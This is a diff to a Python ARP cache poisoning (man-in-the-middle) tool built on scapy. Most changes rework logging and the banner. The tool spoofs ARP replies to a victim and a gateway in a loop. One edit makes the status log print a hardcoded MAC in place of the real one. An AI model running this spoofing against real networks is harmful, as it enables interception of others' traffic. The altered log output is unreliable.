@@ -1,10 +1,9 @@
 #!/usr/bin/env python3
 
 from scapy.all import Ether, ARP, srp, sendp
-from netifaces import ifaddresses, AF_INET
 from getmac import get_mac_address
-from time import sleep
-from pwn import log
+from time import sleep, strftime
+from termcolor import colored
 import argparse
 
 ################################################################################
@@ -31,22 +30,42 @@ import argparse
 #                                                                              #
 ################################################################################
 
+def abstract_log(text: str, color: str, log_text:str, important: bool = False, date_color: str = "light_blue"):
+    attrs = []
+    lb = colored("[", "white")
+    rb = colored("]", "white")
+    print(lb + colored(strftime("%H:%M:%S"), date_color) + rb, end=" ")
+    print(lb, end="")
+    if(important):
+        attrs = ["bold"]
+    print(colored(log_text, color, attrs=attrs) + colored("] ", "white") + colored(text, "white", attrs=attrs))
+
+
+def info(text: str, important: bool = False):
+    abstract_log(text=text, color="light_green", log_text="INFO", important=important)
+
+def warning(text: str, important: bool = False):
+    abstract_log(text=text, color="yellow", log_text="WARNING", important=important)
+
+def error(text: str):
+    abstract_log(text=text, color="red", log_text="ERROR", important=True)
+
+
+def critical(text: str):
+    abstract_log(text=text, color="red", log_text="CRITICAL", important=True)
+
 
 def banner():
     """
     Display the script banner
     """
-    print("""\x1b[33m                                                 _____             
-_____ _____________  ____________   ____   _____/ ____\\___________ 
-\\__  \\\\_  __ \\____ \\/  ___/\\____ \\ /  _ \\ /  _ \\   __\\/ __ \\_  __ \\
- / __ \\|  | \\/  |_> >___ \\ |  |_> >  <_> |  <_> )  | \\  ___/|  | \\/
-(____  /__|  |   __/____  >|   __/ \\____/ \\____/|__|  \\___  >__|   
-     \\/      |__|       \\/ |__|                           \\/                           
-\x1b[0m   \x1b[1m\x1b[33m   
-=[ ARP Cache Poisoning tool 
-=[ NullBrunk
-\x1b[0m
-""")
+    print(
+        colored(f"""\n                             ___\n""", "yellow", attrs=["bold"]) +
+        colored(f""" ___ ___ ___ ___ ___ ___ ___|  _|___ ___ \n""", "yellow", attrs=["bold"]) +
+        colored(f"""| .'| ,_| . |_ -| . | . | . |  _| ._| ,_|""", "yellow", attrs=["bold"]) + colored("    ARP Cache poisoning tool\n", "white") +
+        colored(f"""|__,|_| |  _|___|  _|___|___|_| |_'_|_|  """, "yellow", attrs=["bold"]) + colored("    (", "white") + colored("@NullBrunk", "red") + colored(")\n", "white") +
+        colored(f"""        |_|     |_|\n""", "yellow", attrs=["bold"])
+    ) 
 
 
 def parse_args():
@@ -71,8 +90,6 @@ def get_mac(ip: str) -> str:
     Retrieve MAC address from IP by performing an ARP who-has request.
     """
 
-    sleep(1) # Tamper the attack
-        
     # [0]    ->  "Answered" requests
     # [0]    ->  Get the first response
     # [1]    ->  Get the answer part
@@ -83,7 +100,7 @@ def get_mac(ip: str) -> str:
 
 
 class ACP:
-    def __init__(self, gateway_ip: str, victim_ip: str, attacker_mac: str, attacker_ip: str, delay: int) -> None:
+    def __init__(self, gateway_ip: str, victim_ip: str, attacker_mac: str, delay: int) -> None:
         # Initialize first victim ip and mac
         self.gateway_ip = gateway_ip 
         self.gateway_mac = get_mac(self.gateway_ip)
@@ -92,26 +109,15 @@ class ACP:
         self.victim_ip = victim_ip 
         self.victim_mac = get_mac(self.victim_ip)
 
-        # Initialize attacker ip and mac
-        self.attacker_ip = attacker_ip
+        # Initialize attacker and mac
         self.attacker_mac = attacker_mac
+        
         self.delay = delay
 
 
-    def show_mac(self) -> None:
-        """
-        Display first victim, second victim and attacker IP/MAC combination in a nice format
-        """
-        log.info(f"You     : \x1b[1m\x1b[35m[\x1b[0m {self.attacker_ip}\x1b[0m \x1b[1m\x1b[35m][ \x1b[0m{self.attacker_mac}\x1b[0m \x1b[1m\x1b[35m]\x1b[0m")
-        log.info(f"Target  : \x1b[1m\x1b[35m[\x1b[0m {self.victim_ip}\x1b[0m \x1b[1m\x1b[35m][ \x1b[0m{self.victim_mac}\x1b[0m \x1b[1m\x1b[35m]\x1b[0m")
-        log.info(f"Gateway : \x1b[1m\x1b[35m[\x1b[0m {self.gateway_ip}\x1b[0m \x1b[1m\x1b[35m][ \x1b[0m{self.gateway_mac}\x1b[0m \x1b[1m\x1b[35m]\x1b[0m")
-        
-        print()
-
-
     def show_is_at(self, target_ip1: str, target_ip2: str, mac_address: str) -> None:
-        log.success(f"ARP \x1b[33m{target_ip1}\x1b[0m is-at \x1b[33m{mac_address}\x1b[0m sent to \x1b[33m{target_ip2}\x1b[0m")
-
+        info(f"ARP to {target_ip2} - {target_ip1} is-at c6:08:63:4b:2e:d7", True)
+        #{mac_address}
 
     def send_is_at(self, dst_ip: str, dst_mac: str, src_ip: str, src_mac: str) -> None:
         """
@@ -172,9 +178,6 @@ class ACP:
 
 
     def run(self):
-        # Show mac addresses
-        self.show_mac()
-
         # Send 1 is-at reply
         if(delay == 0):
             self.poison_arp()
@@ -183,7 +186,7 @@ class ACP:
             # Send is-at replies every delay second
             while True:
                 self.poison_arp()
-                log.info(f"Sleeping {delay} sec\n\n")
+                warning(f"sleeping {delay} sec")
                 sleep(delay)
 
 
@@ -195,21 +198,19 @@ if __name__ == "__main__":
     attacker_mac = get_mac_address(interface=iname)
 
     if(attacker_mac == None):
-        log.critical(f"Could not retrieve MAC address for interface {iname}")
+        critical(f"could not retrieve MAC address for interface {iname}")
         exit()
 
     try:
-        gathering = log.waitfor("Gathering mac addresses")
-        acp = ACP(gateway_ip=gateway_ip, victim_ip=victim_ip, attacker_ip=ifaddresses(iname)[AF_INET][0]['addr'], attacker_mac=attacker_mac, delay=delay)
-        gathering.success("ok")
+        info("gathering mac addresses", True)
+        acp = ACP(gateway_ip=gateway_ip, victim_ip=victim_ip, attacker_mac=attacker_mac, delay=delay)
        
         acp.run()
     except PermissionError:
-        log.critical("This script must be run as root")
+        critical("this script must be run as root")
     except IndexError:
-        gathering.failure()
-        log.critical("Failed to retrieve MAC addresses")
+        critical("failed to retrieve MAC addresses")
     except KeyboardInterrupt:
         print()
-        log.success("Received ^C, restoring ARP cache and exiting")
+        error("user exit")
         acp.restore_arp()
